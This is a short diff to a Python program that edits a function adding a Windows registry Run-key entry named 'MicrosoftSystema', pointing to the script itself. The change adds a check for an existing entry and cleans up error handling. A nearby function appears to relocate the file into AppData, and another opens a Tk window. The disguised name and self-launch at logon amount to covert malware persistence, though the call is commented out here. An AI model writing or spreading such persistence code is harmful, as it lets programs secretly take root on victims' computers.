@@ -40,14 +40,20 @@ def cambiar_de_pocicion(lista = f"C:\\Users\\{os.getenv("UserName")}\\AppData\\L
 def regis():
     try:
         key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(key, "MicrosoftSystema", 0, winreg.REG_SZ, os.path.abspath(sys.argv[0]))
-    except:
-        pass
 
-    winreg.CloseKey(key)
+        try:
+            value, _ = winreg.QueryValueEx(key, "MicrosoftSystema")
+        except FileNotFoundError:
+            winreg.CloseKey(key)
+            
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
+            winreg.SetValueEx(key, "MicrosoftSystema", 0, winreg.REG_SZ, os.path.abspath(sys.argv[0]))
 
+        
+    finally:
+        winreg.CloseKey(key)
 
-#regis() j
+#regis() 
 
 def mostre():
     raiz = Tk()
